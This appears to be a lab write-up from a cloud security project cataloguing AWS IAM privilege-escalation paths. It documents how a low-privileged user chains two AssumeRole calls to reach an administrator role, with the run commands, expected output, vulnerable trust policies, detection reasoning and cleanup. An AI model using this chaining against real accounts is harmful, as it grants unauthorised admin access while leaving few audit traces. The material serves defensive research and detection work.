# Path 04 — AssumeRole Chain

## Overview

A low-privileged user is permitted to assume a moderately-privileged role R1.
R1's own permissions include `sts:AssumeRole` on a more-privileged role R2
(AdministratorAccess). Chaining the two assumptions yields admin without any
IAM modification — only `sts:AssumeRole` events appear in CloudTrail, and each
one is individually legitimate.

## Attack flow

```
low-priv user (sts:AssumeRole on R1)
    ↓ AssumeRole(R1)
attacker is now R1 (no admin perms, but holds sts:AssumeRole on R2)
    ↓ AssumeRole(R2)  — R2 trusts R1
attacker is now R2 (AdministratorAccess)
```

## MITRE ATT&CK for Cloud

- **T1078.004** — Valid Accounts: Cloud Accounts
- **T1550.001** — Use Alternate Authentication Material: Application Access Token

## Prerequisites

- Baseline lab deployed (provides the `pathtriage-low-priv-attacker` user and its access keys)
- Scenario 04 lab deployed: `cd environments/scenarios/04_assume_role_chain && terraform apply`
- Python 3 with `boto3` available
- Low-priv access key + secret exported as `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`

## Attack steps

```bash
# 1. Switch the shell to low-priv credentials
cd environments/baseline
export AWS_ACCESS_KEY_ID=$(terraform output -raw low_priv_access_key_id)
export AWS_SECRET_ACCESS_KEY=$(terraform output -raw low_priv_secret_access_key)
unset AWS_SESSION_TOKEN AWS_PROFILE

# 2. Run the chain (ARNs come from scenario 04's terraform output)
python attacks/04_assume_role_chain/exploit.py \
    --r1-arn arn:aws:iam::<acct>:role/pathtriage-assume-role-chain-r1 \
    --r2-arn arn:aws:iam::<acct>:role/pathtriage-assume-role-chain-r2
```

## Expected output

```
[*] acting as: arn:aws:iam::<acct>:user/pathtriage-low-priv-attacker
[*] Step 1: baseline probe — low-priv user iam:CreateUser?
    [+] iam:CreateUser denied (as expected)
[*] Step 2: hop 1 — AssumeRole on R1 ...
    [+] now: arn:aws:sts::<acct>:assumed-role/.../pathtriage-path04-hop1
[*] Step 3: intermediate probe — R1 iam:CreateUser?
    [+] iam:CreateUser denied for R1 (intermediate, as expected)
[*] Step 4: hop 2 — AssumeRole on R2 ...
    [+] now: arn:aws:sts::<acct>:assumed-role/.../pathtriage-path04-hop2
[*] Step 5: final probe — R2 iam:CreateUser?
    [+] iam:CreateUser SUCCEEDS as R2 — chain complete

[+] Path 04 verified: low-priv user -> R1 -> R2 (effective admin)
```

See `verification_log.txt` for a captured run against the deployed lab.

## Vulnerable configuration

The misconfiguration is **not in any single resource** — each trust relationship
is individually reasonable. The vulnerability is the transitive closure of the
two trusts plus R1's `sts:AssumeRole` permission on R2.

R1 trust (intermediate role trusts the low-priv user):

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::<acct>:user/pathtriage-low-priv-attacker" },
    "Action": "sts:AssumeRole"
  }]
}
```

R1 inline policy grants `sts:AssumeRole` on R2 (alongside a benign read-only
baseline so R1 looks like a legitimate intermediate role).

R2 trust (admin role trusts R1):

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::<acct>:role/pathtriage-assume-role-chain-r1" },
    "Action": "sts:AssumeRole"
  }]
}
```

R2 has `arn:aws:iam::aws:policy/AdministratorAccess` attached.

## Why this works

This is the catalogue's **"no fingerprints"** path. Nothing is modified in the
account; CloudTrail only records two `sts:AssumeRole` events, both of which are
individually well-formed. Compare:

| Path | What changes in the account |
|------|------------------------------|
| 03 — CreatePolicyVersion | A new default policy version is minted (visible IAM event) |
| 04 — AssumeRole Chain    | **Nothing.** Trust topology pre-exists; only AssumeRole calls occur |
| 05 — AttachPolicy        | A managed policy is attached to the user (visible IAM event) |

Detection therefore cannot rely on IAM-change events. It has to look at
behavioural patterns in the AssumeRole stream itself — chains of role-to-role
assumptions, especially those terminating in privileged roles, or assumption
paths not seen in historical baselines.

This path is therefore important for the **N2 convergence-based defender
output** argument: the IAM-modification primitive (Paths 3, 5) and the
trust-exploitation primitive (Path 4) require *fundamentally different*
detection logic, and PathTriage's defender-output module must cover both.

## Deferred sections

- **Exploitability score** — applied W5, alongside the Midway Report, under the
  rubric in `docs/scoring_rubric.md` (currently v1 draft).
- **Defender output** — generated W7. Will include:
  - CloudTrail Lake / Athena query template for chained-AssumeRole patterns
  - SCP snippet restricting `sts:AssumeRole` between roles where the source
    principal is itself an assumed-role session (denies the second hop)

## Cleanup

```bash
cd environments/scenarios/04_assume_role_chain
terraform destroy -auto-approve

# Verify no orphan IAM resources remain
aws iam list-roles \
    --query 'Roles[?contains(RoleName, `assume-role-chain`)].RoleName' \
    --output text
# (should be empty)

aws iam list-user-policies --user-name pathtriage-low-priv-attacker \
    --query 'PolicyNames'
# (should NOT include pathtriage-04-can-assume-r1)
```

## References

- Rhino Security Labs — [AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) (method: role chaining)
- MITRE ATT&CK for Cloud — [T1078.004](https://attack.mitre.org/techniques/T1078/004/), [T1550.001](https://attack.mitre.org/techniques/T1550/001/)
- AWS docs — [IAM role chaining](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_terms-and-concepts.html#iam-term-role-chaining)